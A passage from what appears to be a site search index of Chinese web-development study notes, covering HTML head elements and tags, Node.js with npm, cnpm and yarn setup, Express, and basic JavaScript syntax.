\u65b0\u7684\u4e00\u884c\uff0c\u5176\u540e\u7684\u5185\u5bb9\u4e5f\u4f1a\u88ab\u6324\u5230\u4e0b\u4e00\u884c\u5c55\u73b0\u3002\u5757\u7ea7\u5143\u7d20\u4e0d\u4f1a\u88ab\u5d4c\u5957\u8fdb\u5185\u8054\u5143\u7d20\u4e2d\uff0c\u4f46\u53ef\u4ee5\u5d4c\u5957\u5728\u5176\u4ed6\u5757\u7ea7\u5143\u7d20\u4e2d\u3002\u4e3b\u8981\u7528\u4e8e\u5c55\u793a\u7ed3\u6784\u5316\u7684\u5185\u5bb9\uff0c\u5982\u6bb5\u843d\u3001\u5217\u8868\u3001\u5bfc\u822a\u83dc\u5355\u3001\u9875\u811a\u7b49\u3002</li> <li>\u5185\u8054\u5143\u7d20\uff0c\u901a\u5e38\u51fa\u73b0\u5728\u5757\u7ea7\u5143\u7d20\u4e2d\uff0c\u4e0d\u4f1a\u5bfc\u81f4\u6587\u672c\u6362\u884c\u3002</li> </ul>"},{"location":"web/html/#head","title":"&lt;head&gt;","text":"<p><code>&lt;head&gt;</code> \u5143\u7d20\u5305\u542b\u4e86\u6240\u6709\u5934\u90e8\u6807\u7b7e\u5143\u7d20\uff0c\u5728\u8be5\u5143\u7d20\u4e2d\uff0c\u4f60\u53ef\u4ee5\u63d2\u5165\u811a\u672c(Script)\u3001\u6837\u5f0f\u6587\u4ef6(CSS)\u3001\u4ee5\u53ca\u5404\u79cdmeta\u4fe1\u606f\u3002\u5b83\u5305\u542b\u6240\u6709\u4f60\u60f3\u5305\u542b\u5728HTML\u9875\u9762\u4e2d\uff0c\u4f46\u53c8\u4e0d\u662f\u60f3\u5728HTML\u9875\u9762\u4e2d\u663e\u793a\u7684\u5185\u5bb9\u3002</p> <p>\u53ef\u4ee5\u6dfb\u52a0\u5728\u5934\u90e8\u533a\u57df\u7684\u5143\u7d20\u6807\u7b7e\u4e3a:</p> <ul> <li>\u6dfb\u52a0\u6807\u9898\uff1a<code>&lt;title&gt;</code></li> <li>\u6dfb\u52a0\u5143\u6570\u636e\uff1a<code>&lt;meta&gt;</code>\uff0c\u4e3b\u8981\u662f author\u3001description</li> <li>\u589e\u52a0\u81ea\u5b9a\u4e49\u56fe\u6807\uff1a<code>&lt;link&gt;</code></li> <li>\u589e\u52a0 CSS\uff1a<code>&lt;link&gt;</code>\u3001<code>&lt;style&gt;</code></li> <li>\u589e\u52a0 JavaScript\uff1a<code>&lt;script&gt;</code></li> </ul> <pre><code>&lt;!DOCTYPE html&gt;\n&lt;!-- \u58f0\u660e\u6587\u6863\u7c7b\u578b --&gt;\n&lt;html lang=\"zh-CN\"&gt;\n  &lt;!-- \u4e3a\u6587\u6863\u8bbe\u5b9a\u4e3b\u8bed\u8a00 --&gt;\n\n  &lt;head&gt;\n    &lt;!-- \u5305\u542b\u6240\u6709\u4f60\u60f3\u5305\u542b\u5728HTML\u9875\u9762\u4e2d\uff0c\u4f46\u53c8\u4e0d\u662f\u60f3\u5728HTML\u9875\u9762\u4e2d\u663e\u793a\u7684\u5185\u5bb9 --&gt;\n\n    &lt;meta charset=\"UTF-8\" /&gt;\n    &lt;!-- \u8bbe\u7f6e\u6587\u6863\u4f7f\u7528utf-8\u5b57\u7b26\u96c6\u7f16\u7801 --&gt;\n    &lt;title&gt;web\u9875\u9762\u7684\u540d\u5b57&lt;/title&gt;\n\n    &lt;!-- META \u5143\u7d20\u901a\u5e38\u7528\u4e8e\u6307\u5b9a\u7f51\u9875\u7684\u63cf\u8ff0\uff0c\u5173\u952e\u8bcd\uff0c\u6587\u4ef6\u7684\u6700\u540e\u4fee\u6539\u65f6\u95f4\uff0c\u4f5c\u8005\uff0c\u548c\u5176\u4ed6\u5143\u6570\u636e\u3002 --&gt;\n    &lt;meta name=\"author\" content=\"HappyTsing\" /&gt;\n    &lt;meta name=\"description\" content=\"This is a blog.\" /&gt;\n\n    &lt;!-- \u6dfb\u52a0\u81ea\u5b9a\u4e49\u56fe\u6807 --&gt;\n    &lt;link rel=\"shortcut icon\" href=\"favicon.ico\" type=\"image/x-icon\" /&gt;\n\n    &lt;!-- CSS \u5185\u90e8\u6837\u5f0f\u8868 --&gt;\n    &lt;style type=\"text/css\"&gt;\n      body {\n        background-color: yellow;\n      }\n\n      p {\n        color: blue;\n      }\n    &lt;/style&gt;\n\n    &lt;!-- CSS \u5916\u90e8\u6837\u5f0f\u8868 --&gt;\n    &lt;link rel=\"stylesheet\" type=\"text/css\" href=\"mystyle.css\" /&gt;\n\n    &lt;!-- &lt;script&gt;\u6807\u7b7e\u7528\u4e8e\u52a0\u8f7d\u811a\u672c\u6587\u4ef6\uff0c\u5982\uff1a JavaScript\u3002 --&gt;\n    &lt;script&gt;\n      function myFunction() {\n        document.getElementById(\"demo\").innerHTML =\n          \"\u6211\u7684\u7b2c\u4e00\u4e2a JavaScript \u51fd\u6570\";\n      }\n    &lt;/script&gt;\n    &lt;script src=\"myScript.js\" async&gt;&lt;/script&gt;\n  &lt;/head&gt;\n\n  &lt;body&gt;\n    &lt;!-- \u5305\u542b\u4e86\u4f60\u8bbf\u95ee\u9875\u9762\u65f6\u6240\u6709\u663e\u793a\u5728\u9875\u9762\u4e0a\u7684\u5185\u5bb9\uff0c\u6587\u672c\uff0c\u56fe\u7247\uff0c\u97f3\u9891\uff0c\u6e38\u620f\u7b49\u7b49\u3002 --&gt;\n\n    &lt;h1&gt;\u6211\u7684 Web \u9875\u9762&lt;/h1&gt;\n    &lt;p id=\"demo\"&gt;\u4e00\u4e2a\u6bb5\u843d\u3002&lt;/p&gt;\n    &lt;button type=\"button\" onclick=\"myFunction()\"&gt;\u70b9\u51fb\u8fd9\u91cc&lt;/button&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre>"},{"location":"web/html/#_5","title":"\u6807\u7b7e\u7b80\u4ecb","text":"<p>\u5185\u5bb9\u7ed3\u6784\u5316</p> <ul> <li><code>&lt;h1&gt;</code> \u3001<code>&lt;h2&gt;</code>\u3001<code>&lt;h3&gt;</code>\u3001<code>&lt;h4&gt;</code>\u3001<code>&lt;h5&gt;</code>\u3001<code>&lt;h6&gt;</code>\uff1a\u6807\u9898</li> <li><code>&lt;p&gt;</code>\uff1a\u6bb5\u843d</li> </ul> <p>\u91cd\u70b9\u5f3a\u8c03</p> <ul> <li><code>&lt;em&gt;</code>\uff1a\u5f3a\u8c03\uff0c\u8868\u73b0\u4e3a\u659c\u4f53</li> <li><code>&lt;strong&gt;</code>\uff1a\u91cd\u8981\uff0c\u8868\u73b0\u4e3a\u52a0\u7c97</li> </ul> <p>\u6ce8\u610f\uff0c\u4e0a\u8ff0\u4e8c\u8005\u66f4\u9002\u5408\u8868\u73b0\u4e00\u79cd\u98ce\u683c\uff0c\u4f46\u4e0d\u5e94\u8be5\u5e38\u7528\u3002\u800c\u662f\u4f7f\u7528\u5176\u4ed6\u6807\u7b7e\u5982 <code>&lt;span&gt;+CSS</code> \uff0c\u6216\u8005 <code>&lt;i&gt;\u3001&lt;b&gt;</code> \u6765\u5b9e\u73b0\u3002</p> <p>\u8868\u8c61\u5143\u7d20\uff1a\u659c\u4f53\u3001\u7c97\u4f53\u3001\u4e0b\u5212\u7ebf</p> <p>\u5b83\u4eec\u51fa\u73b0\u4e8e\u4eba\u4eec\u8981\u5728\u6587\u672c\u4e2d\u4f7f\u7528\u7c97\u4f53\u3001\u659c\u4f53\u3001\u4e0b\u5212\u7ebf\u4f46 CSS \u4ecd\u7136\u4e0d\u88ab\u5b8c\u5168\u652f\u6301\u7684\u65f6\u671f\u3002\u4ec5\u4ec5\u5f71\u54cd\u8868\u8c61\u800c\u4e14\u6ca1\u6709\u8bed\u4e49\uff0c\u88ab\u79f0\u4e3a\u8868\u8c61\u5143\u7d20\u3002</p> <p>\u6ce8\u610f\uff1a\u4ed6\u4eec\u4e0d\u8be5\u88ab\u4f7f\u7528\uff01\u800c\u5e94\u8be5\u7528 CSS \u5b9e\u73b0\u3002</p> <p>\u8d85\u94fe\u63a5</p> <ul> <li><code>&lt;a&gt;</code>\uff0c\u53ef\u4ee5\u5c06\u5757\u7ea7\u5143\u7d20\u8f6c\u6362\u4e3a\u94fe\u63a5\u3002 <code>&lt;a&gt; &lt;div&gt;&lt;/div&gt; &lt;/a&gt;</code></li> </ul> <p>\u6587\u6863\u7684\u7ec4\u6210\u90e8\u5206</p> <ul> <li>\u9875\u7709\uff1a<code>&lt;header&gt;</code></li> <li>\u5bfc\u822a\u680f\uff1a<code>&lt;nav&gt;</code></li> <li>\u4e3b\u5185\u5bb9\uff1a<code>&lt;main&gt;</code>\uff0c\u4e3b\u5185\u5bb9\u4e2d\u5b58\u5728\u5404\u79cd\u5b57\u5185\u5bb9\u533a\u5757</li> <li><code>&lt;article&gt;</code></li> <li><code>&lt;section&gt;</code></li> <li><code>&lt;div&gt;</code></li> <li>\u4fa7\u8fb9\u680f\uff1a<code>&lt;aside&gt;</code></li> <li>\u9875\u811a\uff1a<code>&lt;footer&gt;</code></li> </ul> <p>\u65e0\u8bed\u4e49\u5143\u7d20</p> <p>\u6709\u65f6\u4f60\u4f1a\u53d1\u73b0\uff0c\u5bf9\u4e8e\u4e00\u4e9b\u8981\u7ec4\u7ec7\u7684\u9879\u76ee\u6216\u8981\u5305\u88c5\u7684\u5185\u5bb9\uff0c\u73b0\u6709\u7684\u8bed\u4e49\u5143\u7d20\u5747\u4e0d\u80fd\u5f88\u597d\u5bf9\u5e94\u3002\u6709\u65f6\u5019\u4f60\u53ef\u80fd\u53ea\u60f3\u5c06\u4e00\u7ec4\u5143\u7d20\u4f5c\u4e3a\u4e00\u4e2a\u5355\u72ec\u7684\u5b9e\u4f53\u6765\u4fee\u9970\u6765\u54cd\u5e94\u5355\u4e00\u7684\u7528 \u00a0CSS\u00a0 \u6216 \u00a0JavaScript\u3002</p> <ul> <li><code>&lt;div&gt;</code>\uff1a\u5757\u7ea7\u65e0\u8bed\u4e49\u5143\u7d20</li> <li><code>&lt;span&gt;</code>\uff1a\u5185\u8054\u65e0\u8bed\u4e49\u5143\u7d20</li> </ul> <p>\u6362\u884c\u4e0e\u6c34\u5e73\u5206\u5272\u7ebf</p> <ul> <li><code>&lt;br&gt;</code>\uff1a\u53ef\u5728\u6bb5\u843d\u4e2d\u8fdb\u884c\u6362\u884c <code>&lt;p&gt;name:HappyTsing&lt;br&gt;age:18&lt;/p&gt;</code></li> <li><code>&lt;hr&gt;</code>\uff1a\u53ef\u5728\u6bb5\u843d\u4e2d\u751f\u6210\u4e00\u6761\u6c34\u5e73\u5206\u5272\u7ebf</li> </ul> <p>\u5217\u8868</p> <ul> <li><code>&lt;ul&gt;</code>\uff1a\u65e0\u5e8f\u5217\u8868\uff0c\u5c5e\u6027\uff1atype(\u9ed8\u8ba4disc\u3001\u65b9\u5757squre\u3001\u7a7a\u5fc3\u5706circle)</li> <li><code>&lt;ol&gt;</code>\uff1a\u6709\u5e8f\u5217\u8868\uff0c\u5c5e\u6027\uff1atype(1\u3001a\u3001A\u3001i\u3001I)\u3001start</li> <li><code>&lt;dl&gt;</code>\uff1a\u81ea\u5b9a\u4e49\u5217\u8868</li> </ul> <pre><code>&lt;ul&gt;\n  &lt;li&gt;\u8c46\u6d46&lt;/li&gt;\n  &lt;li&gt;\u6cb9\u6761&lt;/li&gt;\n&lt;/ul&gt;\n</code></pre> <p>\u8868\u683c</p> <p><code>&lt;table&gt;</code>\uff1a\u8868\u793a\u4e00\u4e2a\u8868\u683c</p> <ul> <li><code>&lt;tr&gt;</code>\uff1a\u8868\u793a\u8868\u683c\u7684\u4e00\u884c</li> <li><code>&lt;td&gt;</code>\uff1a\u8868\u793a\u8868\u683c\u7684\u4e00\u5217</li> <li><code>&lt;th&gt;</code>\uff1a\u7528\u6cd5\u548ctd\u76f8\u540c\uff0c\u4f1a \u52a0\u7c97\uff0c\u81ea\u52a8 \u5c45\u4e2d\uff0c\u4e00\u822c\u7528\u5728\u8868\u683c\u7684\u6700\u4e0a\u9762\u7684\u4e00\u884c</li> </ul> <pre><code>&lt;table border=\"1\" width=\"300px\" height=\"150px\"&gt;\n  &lt;tr&gt;\n    &lt;th&gt;&lt;/th&gt;\n    &lt;td&gt;&lt;/td&gt;\n  &lt;/tr&gt;\n&lt;/table&gt;\n</code></pre>"},{"location":"web/nodejs/","title":"NodeJS","text":""},{"location":"web/nodejs/#_1","title":"\u7b80\u4ecb","text":"<p>Node.js \u662f\u4e00\u4e2a\u57fa\u4e8eChrome V8 \u5f15\u64ce \u7684JavaScript \u8fd0\u884c\u65f6\u73af\u5883\u3002</p> <p>\u8bed\u6cd5\u548cJavaScript\u76f8\u4f3c\uff0c\u5355\u7ebf\u7a0b\uff0c\u540e\u7aef\u8bed\u8a00\u3002</p> <p>\u5176\u81ea\u5e26\u4e00\u4e2a\u5305\u7ba1\u7406\u5668\uff1anpm\u3002\u8fd9\u4e5f\u662f\u5728\u6b64\u5b66\u4e60\u7684\u76ee\u7684\u3002</p> <p>\u4e0b\u8f7d\uff1ahttps://nodejs.org/zh-cn/</p> <p>\u5b98\u7f51\u4ee3\u7801\uff1a\u5982\u4e0b\u5373\u53ef\u6784\u5efa\u4e00\u4e2a\u670d\u52a1\u5668\uff0c\u66b4\u9732\u57283000\u7aef\u53e3\uff0c\u548cjava\u5b9e\u73b0\u7684\u7ed3\u679c\u7c7b\u4f3c\u3002</p> <pre><code>const http = require('http');\n\nconst hostname = '127.0.0.1';\nconst port = 3000;\n\nconst server = http.createServer((req, res) =&gt; {\n  res.statusCode = 200;\n  res.setHeader('Content-Type', 'text/plain');\n  res.end('Hello World');\n});\n\nserver.listen(port, hostname, () =&gt; {\n  console.log(`Server running at http://${hostname}:${port}/`);\n});\n</code></pre> <p>\u4f7f\u7528 <code>npm init</code> \u521d\u59cb\u5316\u4e00\u4e2anodejs\u9879\u76ee\uff0c\u8fd0\u884c\u540e\u4f1a\u81ea\u52a8\u521b\u5efa\u4e00\u4e2a <code>package.json</code> \u6587\u4ef6\uff0c\u5176\u4e2d\u5b58\u653e\u4e86\u9879\u76ee\u7684\u57fa\u7840\u4fe1\u606f(e.g. name, version, author, license)\u3002\u5e76\u4e14\u4ee5\u540e\u4f1a\u5b58\u653e\u8be5\u9879\u76ee\u7684\u4f9d\u8d56(dependencies)\u3002</p> <p>\u5728 <code>npm i</code> \u5b89\u88c5\u4f9d\u8d56\u4e4b\u540e\uff0c\u4f1a\u81ea\u52a8\u518d\u751f\u6210\u4e00\u4e2a <code>package-lock.json</code> \u6587\u4ef6\uff0c\u8be5\u6587\u4ef6\u5728npm5\u4e4b\u540e\u5f15\u5165\uff0c\u76ee\u7684\u662f\u4e3a\u4e86\u89e3\u51b3npm\u4f9d\u8d56\u7248\u672c\u4e0d\u4e00\u81f4\u7684\u95ee\u9898\u3002</p> <p>\u6ce8\u610f\uff1a <code>npm i --save</code> \u4e2d\u7684 <code>--save</code> \u53c2\u6570\u5728npm5\u4e4b\u524d\uff0c\u4f1a\u5c06\u4e0b\u8f7d\u7684\u4f9d\u8d56\u6dfb\u52a0\u5230 <code>package.json</code> \u6587\u4ef6\u4e2d\uff0c\u4f46\u5728\u6b64\u540e\u7684\u7248\u672c\uff0c\u65e0\u9700\u8be5\u53c2\u6570\u4e5f\u4f1a\u81ea\u52a8\u6dfb\u52a0\uff0c\u56e0\u6b64\u4e0d\u8981\u518d\u4f7f\u7528 <code>--save</code> \u53c2\u6570 | \u53c2\u89c1</p>"},{"location":"web/nodejs/#cnpm","title":"cnpm","text":"<p>\u53ef\u4ee5\u4f7f\u7528\u963f\u91cc\u5b9a\u5236\u7684 cnpm \u547d\u4ee4\u884c\u5de5\u5177\u4ee3\u66ff\u9ed8\u8ba4\u7684 npm\u3002</p> <pre><code>npm install -g cnpm --registry=https://registry.npmmirror.com\n\n## https://registry.npm.taobao.org \u4e8e 2022.06.30 \u53f7\u6b63\u5f0f\u4e0b\u7ebf\u548c\u505c\u6b62 DNS \u89e3\u6790\n</code></pre> <p>\u6b64\u540e\uff0c\u5c31\u53ef\u4ee5\u4f7f\u7528 cnpm \u4ee3\u66ff npm\u4e86\u3002</p> <p>\u5982\u679ccnpm\u4e0b\u8f7d\u6709\u95ee\u9898\uff0c\u53ef\u4ee5\u4f7f\u7528 npm \uff0c\u5e76\u52a0\u4e0a <code>--registry</code> \u6765\u4f7f\u7528\u6dd8\u5b9d\u6e90\u4e0b\u8f7d\u3002</p>"},{"location":"web/nodejs/#yarn","title":"yarn","text":"<p>Yarn\u662f\u7531Facebook\u3001Google\u3001Exponent \u548c Tilde \u8054\u5408\u63a8\u51fa\u4e86\u4e00\u4e2a\u65b0\u7684 JS \u5305\u7ba1\u7406\u5de5\u5177\uff0c\u5b83\u5f25\u8865\u4e86npm \u4e00\u4e9b\u7f3a\u9677\u3002\u5982\u4e0b\u8f7d\u901f\u5ea6\u6162\u3001\u540c\u4e00\u4e2a\u9879\u76ee\u5b89\u88c5\u65f6\u65e0\u6cd5\u4fdd\u8bc1\u4e00\u81f4\u6027\u7b49\u3002</p> <p>yarn\u5b89\u88c5\u65f6\u4f1a\u5c06\u4f9d\u8d56\u5199\u5165 <code>package.json</code> \uff0c\u540c\u65f6\u751f\u6210\u4e00\u4e2a <code>yarn.lock</code> \u4fdd\u8bc1\u7248\u672c\u4e00\u81f4\u6027\u3002</p> <p>\u4e0d\u8fc7\u5728npm 5.0\u4e4b\u540e(\u76ee\u524d\u4ee58.x)\uff0cnpm\u5b89\u88c5\u4f9d\u8d56\u65f6\uff0c\u4f1a\u751f\u6210 <code>package-lock.json</code> \u6587\u4ef6\uff0c\u4e5f\u80fd\u4fdd\u8bc1\u4e00\u81f4\u6027\u3002\u4f46\u7531\u4e8eyarn\u662f\u5f02\u6b65\u4e0b\u8f7d\uff0c\u56e0\u6b64\u901f\u5ea6\u8fd8\u662f\u66f4\u5feb\u3002</p> <p>\u6b64\u5916\uff0cnpm\u8f93\u51fa\u6742\u4e71\uff0c\u4e14\u8001\u5931\u8d25\uff0c\u63a8\u8350\u4f7f\u7528yarn\u2b50\ufe0f\u3002</p> <pre><code>npm install -g yarn --registry=https://registry.npmmirror.com  ## \u9700\u914d\u7f6eyarn\u7684\u73af\u5883\u53d8\u91cf\nbrew install yarn  ## \u63a8\u8350\u8fd9\u79cd\u65b9\u5f0f\uff0c\u6b64\u540eyarn\u5b89\u88c5\u7684\u5168\u5c40\u4f9d\u8d56\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\uff0c\u65e0\u9700\u914d\u7f6e\u73af\u5883\u53d8\u91cf\nyarn config set registry registry.npmmirror.com\n</code></pre>"},{"location":"web/nodejs/#_2","title":"\u6307\u4ee4\u5bf9\u6bd4","text":"desc yarn npm \u521d\u59cb\u5316package.json yarn init [-y] npm init [-y] \u6839\u636epackage.json\u5b89\u88c5\u4f9d\u8d56 yarn [install] npm install\uff08\u7f29\u5199 npm i\uff09 \u5b89\u88c5\u4f9d\u8d56\uff08dependencies\uff09 yarn add packageName npm i packageName \u5b89\u88c5\u4f9d\u8d56\uff08devDependencies\uff09 yarn add packageName -D npm install packageName -D \u5168\u5c40\u5b89\u88c5\u4f9d\u8d56 yarn global add PackageName npm install packageName -g \u79fb\u9664\u4f9d\u8d56 yarn remove packageName npm uninstall packageName \u79fb\u9664\u5168\u5c40\u4f9d\u8d56 yarn global remove packageName npm uninstall packageName -g \u5347\u7ea7\u4f9d\u8d56 yarn upgrade packageName npm update packageName \u5347\u7ea7\u5168\u5c40\u4f9d\u8d56 yarn global upgrade packageName npm update packageName -g \u67e5\u770b\u4f9d\u8d56 yarn [global] list --depth=0 npm list [-g] --depth 0"},{"location":"web/nodejs/#express","title":"Express\u6846\u67b6","text":"<p>\u7c7b\u4f3c\u4e8ejava\u7684springboot\u6846\u67b6\uff0c\u7528\u4e8e\u65b9\u4fbfnodejs\u7684\u540e\u7aef\u5f00\u53d1\u3002</p> <pre><code>//express_demo.js \u6587\u4ef6\nvar express = require('express');\nvar app = express();\n\napp.get('/', function (req, res) {\n   res.send('Hello World');\n})\n\nvar server = app.listen(8081, function () {\n\n  var host = server.address().address\n  var port = server.address().port\n\n  console.log(\"\u5e94\u7528\u5b9e\u4f8b\uff0c\u8bbf\u95ee\u5730\u5740\u4e3a http://%s:%s\", host, port)\n\n})\n</code></pre>"},{"location":"web/nodejs/#nodejs_1","title":"\u8fd0\u884cnodejs\u4ee3\u7801","text":"<pre><code>node xxx.js\n</code></pre>"},{"location":"web/javascript/async/","title":"\u5f02\u6b65(todo)","text":""},{"location":"web/javascript/async/#js","title":"\u540c\u6b65 JS","text":"<p>\u4efb\u4f55\u65f6\u5019\u53ea\u80fd\u505a\u4e00\u4ef6\u4e8b\u60c5, \u53ea\u6709\u4e00\u4e2a\u4e3b\u7ebf\u7a0b\uff0c\u5176\u4ed6\u7684\u4e8b\u60c5\u90fd\u963b\u585e\u4e86\uff0c\u76f4\u5230\u524d\u9762\u7684\u64cd\u4f5c\u5b8c\u6210\u3002</p> <p>\u5373\uff0cJS \u7684\u4ee3\u7801\u4ece\u524d\u5f80\u540e\u4f9d\u6b21\u6267\u884c\u3002</p>"},{"location":"web/javascript/async/#js_1","title":"\u5f02\u6b65 JS","text":""},{"location":"web/javascript/basic/","title":"\u57fa\u672c\u8bed\u6cd5","text":"<p>\u53c2\u8003: JavaScript | MDN</p>"},{"location":"web/javascript/basic/#_2","title":"\u53d8\u91cf","text":"<p>\u58f0\u660e\u53d8\u91cf</p> <ul> <li>var\uff1a\u53ef\u4ee5\u591a\u6b21\u58f0\u660e\uff0c\u4e14\u62e5\u6709\u53d8\u91cf\u63d0\u5347\u3002</li> <li>let\uff1a\u4e0d\u53ef\u591a\u6b21\u58f0\u660e\uff0c\u5728\u4efb\u4f55\u65f6\u5019\u90fd\u5e94\u8be5\u4f7f\u7528 let\u3002\u9664\u975e\u9700\u8981\u652f\u6301 11 \u7248\u4e4b\u524d\u7684 Internet Explorer</li> <li>const \u7528\u4e8e\u58f0\u660e\u4e00\u4e2a\u6216\u591a\u4e2a\u5e38\u91cf\uff0c\u58f0\u660e\u65f6\u5fc5\u987b\u8fdb\u884c\u521d\u59cb\u5316\uff0c\u4e14\u521d\u59cb\u5316\u540e\u503c\u4e0d\u53ef\u518d\u4fee\u6539\u3002</li> </ul> <p>\u53d8\u91cf\u7c7b\u578b Number\u3001String\u3001Boolean\u3001Array\u3001Object</p> <p>String</p> <ul> <li>\u8fde\u63a5\u5b57\u7b26\u4e32\uff1a+</li> <li>\u5b57\u7b26\u4e32\u957f\u5ea6\uff1amyString.length\uff1b</li> <li>\u83b7\u53d6\u5b57\u7b26\u4e32\u7684\u7b2c n \u4e2a\u5b57\u7b26\uff1amyString[n-1]\uff1b</li> <li>\u8f6c\u6362\u5927\u5c0f\u5199\uff1atoLowerCase() \u548c toUpperCase()</li> <li>\u66ff\u6362\u5b57\u7b26\u4e32\u7684\u67d0\u90e8\u5206\uff1areplace()</li> <li>\u83b7\u53d6\u6307\u5b9a\u4f4d\u7f6e\u5904\u5b57\u7b26\uff1acharAt(index) \u65b9\u6cd5</li> <li>\u67e5\u627e\u5b50\u4e32\u5e76\u63d0\u53d6\uff1amyString.indexOf(\u2019substring\u2019); //\u627e\u4e0d\u5230\u8fd4\u56de-1</li> </ul> <p>Array</p> <pre><code>// \u4e00\u7ef4\u6570\u7ec4\nlet arrayname=new Array\uff08...\uff09;\nlet arrayname=[...];\n\n// \u591a\u7ef4\u6570\u7ec4\nlet arrayname=[ [...],[...] ];\n\n// \u4fee\u6539\u6570\u7ec4\narrayname[index]=new_value;\n\n// \u6570\u7ec4\u957f\u5ea6\narrayname.length;\n\n// \u6570\u7ec4\u6392\u5e8fsortby \u662f\u53ef\u9009\u7684\uff0c\u89c4\u5b9a\u6392\u5e8f\u987a\u5e8f\uff0c\u5fc5\u9700\u662f\u51fd\u6570\u3002\u5982\u679c\u6ca1\u6709\u53c2\u6570\u7684\u8bdd\uff0c\u5c06\u4f1a\u6309\u7167\u5b57\u7b26\u7f16\u7801\u987a\u5e8f\u8fdb\u884c\u6392\u5e8f\u3002\u5982\u679c\u60f3\u6309\u7167\u5176\u4ed6\u6807\u51c6\u8fdb\u884c\u6392\u5e8f\uff0c\u5219\u9700\u8981\u63d0\u4f9b\u6bd4\u8f83\u51fd\u6570\u3002\narrayObject.sort(sortby);\n\n// \u8fdb\u51fa\u6808\u64cd\u4f5c\uff0c\u6700\u540e\u4e00\u4f4d\u79fb\u5165\u6216\u79fb\u9664\narrayname.pop();\narrayname.push(\u201c1\u201d\uff0c\u201c2\u201d...\uff0c\u201cn\u201d);\n\n// \u6570\u7ec4\u548c\u5b57\u7b26\u4e32\u4e4b\u95f4\u7684\u8f6c\u6362\uff1a\n\n// 1. split\uff08\uff09\uff1a\u5b57\u7b26\u4e32-&gt;\u6570\u7ec4\n\"1:2:3:4\".split(\":\")    // returns [\"1\", \"2\", \"3\", \"4\"]\n\"|a|b|c\".split(\"|\")    // returns [\"\", \"a\", \"b\", \"c\"]\n\n// 2. join\uff08\uff09\u65b9\u6cd5\uff1a\u6570\u7ec4-&gt;\u5b57\u7b26\u4e32\n[\"1\", \"2\", \"3\", \"4\"].join(\":\"); // returns \"1:2:3:4\"\n[\"\", \"a\", \"b\", \"c\"].join(\"|\"); // returns \"|a|b|c\"\n</code></pre>"},{"location":"web/javascript/basic/#ifswitch","title":"\u6761\u4ef6\u5224\u65ad\uff1aif\u3001switch","text":"<pre><code>if () {\n\n} else if () {\n\n} else {}\n\nswitch (expression) {\n    case choice1:\n        // code\n        break;\n\n    case choice2:\n        // code\n        break;\n\n    default:\n        //\u4e00\u4e2a\u90fd\u6ca1\u6709\u5339\u914d\u65f6\u8fd0\u884c\n}\n</code></pre>"},{"location":"web/javascript/basic/#forwhile","title":"\u5faa\u73af\uff1afor\u3001while","text":"<pre><code>for (a in b) {\n}\nfor (var i = 0; i &lt; n; i++) {}\n\nwhile (cond) {}\ndo {} while (cond);\n</code></pre> <p>\u53ef\u7528 continue\u3001break \u63a7\u5236\u3002</p>"},{"location":"web/javascript/basic/#trycatch","title":"\u5f02\u5e38\uff1atry\u3001catch","text":"<pre><code>try {\n   try_statements\n}\n[catch (exception_var_1 if condition_1) { // non-standard\n   catch_statements_1\n}]\n...\n[catch (exception_var_2) {\n   catch_statements_2\n}]\n[finally {\n   finally_statements // \u65e0\u8bba\u662f\u5426\u6709\u5f02\u5e38\u90fd\u4f1a\u6267\u884c\n}]\n</code></pre>"},{"location":"web/javascript/basic/#function","title":"\u51fd\u6570\uff1afunction","text":"<pre><code>function fc_name(params) {\n  // do something\n  // arguments[0] \u8c03\u7528arguments\u5bf9\u8c61\u83b7\u53d6\u53c2\u6570\uff0c\u5f53\u7136\u4e5f\u53ef\u76f4\u63a5\u4f7f\u7528params\n  // arguments.length\n  return rt_value;\n}\n\n// \u533f\u540d\u51fd\u6570\nvar myButton = document.querySelector(\"button\");\nmyButton.onclick = function () {\n  //\u6b64function\u6ca1\u6709fc_name\n  alert(\"hello\");\n};\n</code></pre> <p>ECMAScript \u51fd\u6570\u7684\u53c2\u6570\u4e0e\u5176\u5b83\u8bed\u8a00\u4e0d\u540c\uff0c\u5b83\u4e0d\u4ecb\u610f\u4f20\u6765\u591a\u5c11\u53c2\u6570\uff0c\u4e5f\u4e0d\u4ecb\u610f\u53c2\u6570\u662f\u4ec0\u4e48\u7c7b\u578b\u3002</p> <p>\u5373\u4fbf\u4f60\u5b9a\u4e49\u7684\u51fd\u6570\u53ea\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u4f46\u8c03\u7528\u65f6\u53ef\u4ee5\u4f20\u9012\u4e00\u4e2a\u3001\u4e09\u4e2a\u751a\u81f3\u4e0d\u4f20\u9012\u53c2\u6570\u3002</p> <p>\u539f\u56e0\u662f ECMAScript \u4e2d\u7684\u53c2\u6570\u5728\u5185\u90e8\u662f\u7528\u4e00\u4e2a\u6570\u7ec4\u6765\u8868\u793a\u7684\uff0c\u51fd\u6570\u63a5\u6536\u5230\u7684\u59cb\u7ec8\u662f\u8fd9\u4e2a\u6570\u7ec4\uff0c\u800c\u4e0d\u5173\u5fc3\u6570\u7ec4\u7684\u5185\u5bb9\u3002</p> <p>\u5b9e\u9645\u4e0a\uff0c\u5728\u51fd\u6570\u4f53\u5185\u53ef\u4ee5\u901a\u8fc7 <code>arguments</code> \u5bf9\u8c61\u6765\u8bbf\u95ee\u8fd9\u4e2a\u53c2\u6570\u6570\u7ec4\uff0c\u4ece\u800c\u83b7\u53d6\u4f20\u9012\u7ed9\u51fd\u6570\u7684\u6bcf\u4e00\u4e2a\u53c2\u6570\u3002</p> <p>\u6b64\u5916\uff0c\u6ca1\u6709\u91cd\u8f7d\u3002\u51fd\u6570\u540d\u53ea\u5c5e\u4e8e\u540e\u5b9a\u4e49\u7684\u51fd\u6570\u3002</p>"},{"location":"web/javascript/bom-dom/","title":"BOM \u548c DOM","text":""},{"location":"web/javascript/bom-dom/#bom","title":"BOM","text":"<p>ECMAScript \u662f JavaScript \u7684\u6838\u5fc3\uff0c\u4f46\u5982\u679c\u8981\u5728 Web \u4e2d\u4f7f\u7528 JavaScript\uff0c\u90a3\u4e48 BOM \u65e0\u7591\u624d\u662f\u6838\u5fc3\u3002</p> <p>BOM \u63d0\u4f9b\u4e86\u5f88\u591a\u5bf9\u8c61\uff0c\u7528\u4e8e\u8bbf\u95ee\u6d4f\u89c8\u5668\u7684\u529f\u80fd\uff0c\u8fd9\u4e9b\u529f\u80fd\u4e0e\u4efb\u4f55\u7f51\u9875\u5185\u5bb9\u65e0\u5173\u3002</p> <p>BOM 